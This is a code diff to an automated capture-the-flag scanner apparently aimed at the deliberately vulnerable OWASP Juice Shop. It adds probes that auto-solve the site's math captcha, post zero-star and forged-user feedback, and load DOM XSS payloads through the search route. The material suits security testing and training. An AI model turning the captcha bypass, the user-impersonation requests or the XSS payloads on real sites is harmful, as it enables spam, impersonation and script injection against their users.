@@ -378,13 +378,23 @@ class CTFCoordinator:
 
     def _build_final_report(self, start_time: datetime) -> Dict:
         """Merge and deduplicate findings from all agents."""
-        # Deduplicate by (vuln_type, endpoint, parameter)
+        # Sort by severity (highest first) so dedup keeps the most impactful finding
+        severity_rank = {"critical": 0, "high": 1, "medium": 2, "low": 3, "info": 4}
+        sorted_findings = sorted(
+            self._all_findings,
+            key=lambda f: severity_rank.get(f.get("severity", "medium"), 2),
+        )
+
+        # Deduplicate by (vuln_type, normalized_endpoint, parameter)
         seen = set()
         unique_findings = []
-        for f in self._all_findings:
+        for f in sorted_findings:
+            endpoint = f.get("affected_endpoint", f.get("url", ""))
+            # Normalize: strip query params + trailing slash for dedup
+            normalized_ep = endpoint.split("?")[0].rstrip("/") if endpoint else ""
             key = (
                 f.get("vulnerability_type", ""),
-                f.get("affected_endpoint", f.get("url", "")),
+                normalized_ep,
                 f.get("parameter", ""),
             )
             if key not in seen:
@@ -966,6 +976,8 @@ class CTFCoordinator:
                 self._probe_authed_admin(session, base),
                 self._probe_authed_api_manipulation(session, base, api_paths[:15]),
                 self._probe_parameter_manipulation(session, base, api_paths[:15]),
+                self._probe_zero_stars(session, base),
+                self._probe_forged_feedback(session, base),
             ]
             results = await asyncio.gather(*probes, return_exceptions=True)
 
@@ -1166,6 +1178,131 @@ class CTFCoordinator:
                     continue
         return findings
 
+    async def _probe_zero_stars(self, session, base: str) -> Optional[Dict]:
+        """Solve the Zero Stars challenge: submit feedback with rating=0.
+
+        Juice Shop's /api/Feedbacks requires a valid captcha. We fetch one,
+        solve the simple math expression, and POST with rating=0.
+        """
+        try:
+            # Step 1: Get a captcha
+            async with session.get(f"{base}/rest/captcha/", ssl=False) as resp:
+                if resp.status != 200:
+                    return None
+                captcha_data = await resp.json()
+                captcha_id = captcha_data.get("captchaId")
+                captcha_text = captcha_data.get("captcha", "")
+
+            if not captcha_id or not captcha_text:
+                return None
+
+            # Step 2: Solve the math captcha (format: "X op Y" where op is +, -, *)
+            captcha_answer = None
+            try:
+                # Extract just the math part (remove HTML if present)
+                import re
+                math_match = re.search(r'(\d+)\s*([+\-*])\s*(\d+)', captcha_text)
+                if math_match:
+                    a, op, b = int(math_match.group(1)), math_match.group(2), int(math_match.group(3))
+                    if op == '+':
+                        captcha_answer = a + b
+                    elif op == '-':
+                        captcha_answer = a - b
+                    elif op == '*':
+                        captcha_answer = a * b
+            except Exception:
+                return None
+
+            if captcha_answer is None:
+                return None
+
+            # Step 3: POST feedback with rating=0 (the Zero Stars exploit)
+            payload = {
+                "UserId": 1,
+                "captchaId": captcha_id,
+                "captcha": str(captcha_answer),
+                "comment": "test (***anonymous***)",
+                "rating": 0,
+            }
+            async with session.post(f"{base}/api/Feedbacks/", json=payload, ssl=False) as resp:
+                if resp.status in (200, 201):
+                    body = await resp.text()
+                    try:
+                        data = json.loads(body)
+                        if data.get("data", {}).get("id"):
+                            await self._log_callback("warning", f"[AuthProbe] Zero Stars: feedback with rating=0 accepted")
+                            finding = self._make_finding(
+                                "Zero Stars - Business Logic Bypass", "business_logic", "medium",
+                                f"{base}/api/Feedbacks/", "rating", "0",
+                                "Submitted feedback with rating=0 (bypasses 1-5 range)", "POST")
+                            finding["agent_label"] = "AuthProbe"
+                            return finding
+                    except json.JSONDecodeError:
+                        pass
+        except Exception:
+            pass
+        return None
+
+    async def _probe_forged_feedback(self, session, base: str) -> Optional[Dict]:
+        """Submit feedback as a different user (Forged Feedback challenge)."""
+        try:
+            # Get captcha first
+            async with session.get(f"{base}/rest/captcha/", ssl=False) as resp:
+                if resp.status != 200:
+                    return None
+                captcha_data = await resp.json()
+                captcha_id = captcha_data.get("captchaId")
+                captcha_text = captcha_data.get("captcha", "")
+
+            if not captcha_id or not captcha_text:
+                return None
+
+            # Solve captcha
+            import re
+            captcha_answer = None
+            math_match = re.search(r'(\d+)\s*([+\-*])\s*(\d+)', captcha_text)
+            if math_match:
+                a, op, b = int(math_match.group(1)), math_match.group(2), int(math_match.group(3))
+                if op == '+':
+                    captcha_answer = a + b
+                elif op == '-':
+                    captcha_answer = a - b
+                elif op == '*':
+                    captcha_answer = a * b
+
+            if captcha_answer is None:
+                return None
+
+            # Post feedback as a different user (UserId != our authenticated user)
+            # Our token is typically user 1 or admin; forge as user 2
+            payload = {
+                "UserId": 2,
+                "captchaId": captcha_id,
+                "captcha": str(captcha_answer),
+                "comment": "forged feedback test (***anonymous***)",
+                "rating": 3,
+            }
+            async with session.post(f"{base}/api/Feedbacks/", json=payload, ssl=False) as resp:
+                if resp.status in (200, 201):
+                    body = await resp.text()
+                    try:
+                        data = json.loads(body)
+                        result = data.get("data", {})
+                        # Check if the UserId was accepted as 2 (different from our auth)
+                        if result.get("id") and result.get("UserId") == 2:
+                            await self._log_callback("warning", f"[AuthProbe] Forged Feedback: posted as UserId=2")
+                            finding = self._make_finding(
+                                "Forged Feedback - User Impersonation", "broken_access_control", "high",
+                                f"{base}/api/Feedbacks/", "UserId", "2",
+                                "Submitted feedback as a different user by manipulating UserId", "POST")
+                            finding["agent_label"] = "AuthProbe"
+                            return finding
+                    except json.JSONDecodeError:
+                        pass
+        except Exception:
+            pass
+        return None
+
     # ------------------------------------------------------------------
     # Phase 1.6: Browser Probes
     # ------------------------------------------------------------------
@@ -1181,6 +1318,7 @@ class CTFCoordinator:
         validator = BrowserValidator(screenshots_dir="reports/screenshots")
         await validator.start(headless=True)
         try:
+            await self._probe_ctf_challenge_triggers(validator)
             await self._probe_dom_xss(validator)
             await self._probe_hidden_pages(validator)
             await self._probe_client_side_exploits(validator)
@@ -1189,6 +1327,64 @@ class CTFCoordinator:
         finally:
             await validator.stop()
 
+    async def _probe_ctf_challenge_triggers(self, validator):
+        """Navigate to known Juice Shop challenge URLs to trigger Angular-based solves.
+
+        Many Juice Shop challenges are solved by simply visiting a specific SPA route.
+        The Angular frontend detects the navigation and marks the challenge as solved
+        server-side. This probe directly targets these easy wins without any filtering.
+        """
+        base = self.target.rstrip("/")
+
+        # Each entry: (url, wait_seconds, description)
+        challenge_routes = [
+            (f"{base}/#/score-board", 3, "Score Board"),
+            (f"{base}/#/privacy-security/privacy-policy", 3, "Privacy Policy"),
+            (f"{base}/#/photo-wall", 2, "Photo Wall"),
+            (f"{base}/#/deluxe-membership", 2, "Deluxe Membership"),
+            (f"{base}/#/track-result", 2, "Track Result"),
+            (f"{base}/#/accounting", 2, "Accounting"),
+        ]
+
+        # DOM XSS via search — the Angular app renders the payload in DOM,
+        # triggering the challenge solve without needing a dialog popup
+        xss_payloads = [
+            (f'{base}/#/search?q=<iframe src="javascript:alert(`xss`)">', 4, "DOM XSS (iframe)"),
+            (f'{base}/#/search?q=<img src=x onerror=alert(`xss`)>', 3, "DOM XSS (img)"),
+        ]
+
+        context = await validator.browser.new_context(
+            ignore_https_errors=True,
+            user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0"
+        )
+        try:
+            page = await context.new_page()
+            # Warm up: visit homepage first to init Angular app + session
+            await page.goto(base, wait_until="networkidle", timeout=15000)
+            await asyncio.sleep(1)
+
+            solved_before = set(self._baseline_solved)
+            triggered = 0
+
+            # Visit challenge routes
+            for url, wait_s, desc in challenge_routes + xss_payloads:
+                try:
+                    await page.goto(url, wait_until="networkidle", timeout=10000)
+                    await asyncio.sleep(wait_s)
+                    triggered += 1
+                except Exception:
+                    continue
+
+            await self._log_callback("info", f"[BrowserProbe] CTF challenge triggers: visited {triggered} routes")
+
+            # Check what we solved
+            await self._check_newly_solved("challenge_triggers")
+
+        except Exception as e:
+            await self._log_callback("debug", f"[BrowserProbe] Challenge trigger error: {e}")
+        finally:
+            await context.close()
+
     async def _probe_dom_xss(self, validator):
         """Test for DOM-based XSS via URL fragments and query params."""
         base = self.target.rstrip("/")
@@ -1196,14 +1392,18 @@ class CTFCoordinator:
             '<img src=x onerror=alert(document.domain)>',
             '"><svg onload=alert(1)>',
         ]
-        # Test fragments on a small representative set of pages
-        test_urls = [base]
+        # Prioritize search endpoints — these are the most common XSS vectors
+        search_urls = [f"{base}/search", f"{base}/rest/products/search"]
+        other_urls = [base]
         if self._recon_data:
-            test_urls += [
-                (e if isinstance(e, str) else e.get("url", ""))
-                for e in self._recon_data.endpoints[:20]
-            ]
-        test_urls = list(dict.fromkeys(u for u in test_urls if u))[:5]  # dedup, limit to 5
+            for e in self._recon_data.endpoints[:30]:
+                url = e if isinstance(e, str) else e.get("url", "")
+                if url and any(k in url.lower() for k in ("search", "q=", "query")):
+                    search_urls.append(url)
+                elif url:
+                    other_urls.append(url)
+        # Search URLs first, then other URLs, deduped, limit to 6
+        test_urls = list(dict.fromkeys(u for u in search_urls + other_urls if u))[:6]
 
         for url in test_urls:
             found = False
@@ -1284,14 +1484,17 @@ class CTFCoordinator:
                     page_text = await page.evaluate("() => document.body?.innerText?.substring(0, 500) || ''")
 
                     # Skip if very similar to homepage (SPA fallback)
-                    # Use simple overlap ratio: shared chars / max length
-                    shorter = min(len(page_text), len(home_text))
-                    if shorter > 0:
-                        common = sum(1 for a, b in zip(page_text, home_text) if a == b)
-                        similarity = common / max(len(page_text), len(home_text), 1)
+                    # Use word-set overlap (Jaccard similarity) — more robust than
+                    # char-by-char comparison for SPAs where the nav shell is identical
+                    page_words = set(page_text.lower().split())
+                    home_words = set(home_text.lower().split())
+                    if page_words and home_words:
+                        intersection = page_words & home_words
+                        union = page_words | home_words
+                        similarity = len(intersection) / len(union) if union else 1.0
                     else:
                         similarity = 1.0
-                    if similarity > 0.85:
+                    if similarity > 0.75:
                         continue
                     # Skip generic error indicators
                     if any(k in page_text.lower() for k in ("page not found", "404", "not authorized", "forbidden")):
